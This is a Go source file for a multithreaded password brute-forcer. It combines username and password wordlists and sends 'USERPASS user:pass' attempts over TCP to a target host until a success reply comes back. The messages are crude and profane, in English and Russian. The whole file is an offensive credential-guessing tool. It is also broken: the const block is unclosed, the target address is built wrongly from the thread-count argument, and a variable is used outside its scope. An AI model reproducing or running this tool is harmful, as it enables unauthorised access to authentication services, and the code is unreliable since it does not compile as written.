package main

import (
 "bufio"
 "fmt"
 "net"
 "os"
 "strings"
 "sync"
 "sync/atomic"
 "time"
 "strconv"
)

const (
 requestDelay  = 300 * time.Millisecond // Pauses between request

var totalAttempts int64 // Number of attempts

func main() {
 if len(os.Args) != 6 {
  fmt.Println("No, bro! Look how to use this shit: go run main.go <файл_с_usernames> <файл_с_паролями> <кол-во_потоков> <host> <port>")
  return
 }

 usernamesFile := os.Args[1]
 passwordsFile := os.Args[2]

 socket := os.Args[3] + os.Args[4]

 numWorkers, err := strconv.Atoi(os.Args[3])
 if err != nil {
  fmt.Println("Wtf?!: number of threads must to be a number, asshole!")
  return
 }

 usernames, err := readLines(usernamesFile)
 if err != nil {
  fmt.Printf("Oops, some shit happens with your file with usernames: %v\n", err)
  return
 }

 passwords, err := readLines(passwordsFile)
 if err != nil {
  fmt.Printf("PuPuPuuuu, file with passwords not correct: %v\n", err)
  return
 }

 totalCombinations := len(usernames) * len(passwords)
 fmt.Printf("Pair count: %d\n", totalCombinations)

 resultFile, err := os.Create("brut-result.txt")
 if err != nil {
  fmt.Printf("I really don't give a fuck, but result file is not created ¯\\_(ツ)_/¯ %v\n", err)
  return
 }
 defer resultFile.Close()

 credentialsChan := make(chan string, numWorkers*2)
 resultsChan := make(chan string, numWorkers)
 progressChan := make(chan int64, numWorkers)
 var wg sync.WaitGroup

 for i := 0; i < numWorkers; i++ {
  wg.Add(1)
  go worker(credentialsChan, resultsChan, progressChan, &wg)
 }

 go func() {
  for _, username := range usernames {
   for _, password := range passwords {
    credentialsChan <- fmt.Sprintf("USERPASS %s:%s", username, password)
   }
  }
  close(credentialsChan)
 }()

 go func() {
  for completed := range progressChan {
   percent := float64(completed) / float64(totalCombinations) * 100
   fmt.Printf("\rProgress: %.2f%%", percent)
  }
 }()

 go func() {
  wg.Wait()
  close(resultsChan)
  close(progressChan)
 }()

 for result := range resultsChan {
  _, err := resultFile.WriteString(result + "\n")
  if err != nil {
   fmt.Printf("Blyatsukanahuy, we have a trouble with writing to a file: %v\n", err)
  }
 }

 fmt.Println("\nAuf, we did it. Result writing to a brut-result.txt")
}

func worker(credentialsChan <-chan string, resultsChan chan<- string, progressChan chan<- int64, wg *sync.WaitGroup) {
 defer wg.Done()
 for credentials := range credentialsChan {
  conn, err := net.Dial("tcp", socket)
  if err != nil {
   fmt.Printf("Ошибка при подключении: %v\n", err)
   continue
  }

  // Wait response from a server
  response := readServerResponse(conn)
  if !strings.Contains(response, "220 Authentication Service Ready") {
   conn.Close()
   continue
  }

  // Some waiting
  time.Sleep(100 * time.Millisecond)

  // Request command USERPASS username:password
  _, err = conn.Write([]byte(credentials + "\n"))
  if err != nil {
   conn.Close()
   continue
  }

  // Some time for server eat request
  time.Sleep(300 * time.Millisecond)

  // Read response from server
  response = readServerResponse(conn)
  conn.Close()

  // If login successful, writing into a file and stop worker
  if strings.Contains(response, "230 Authentication successful") {
   fmt.Println("\n[+] Ae, we find a pass:", credentials)
   resultsChan <- fmt.Sprintf("Aaauuuf authentication successful: %s", credentials)
   os.Exit(0) // Завершаем программу при успехе
  }

  // Increase counter of processed pairs
  progressChan <- atomic.AddInt64(&totalAttempts, 1)

  // Pause before next req
  time.Sleep(requestDelay)
 }
}

// Read response from server
func readServerResponse(conn net.Conn) string {
 response := make([]byte, 1024)
 conn.SetReadDeadline(time.Now().Add(2 * time.Second))
 n, err := conn.Read(response)
 if err != nil {
  return ""
 }
 return string(response[:n])
}

// readLines - read files data
func readLines(filename string) ([]string, error) {
 file, err := os.Open(filename)
 if err != nil {
  return nil, err
 }
 defer file.Close()
 var lines []string
  scanner := bufio.NewScanner(file)
  for scanner.Scan() {
   lines = append(lines, strings.TrimSpace(scanner.Text()))
  }
  return lines, scanner.Err()
 }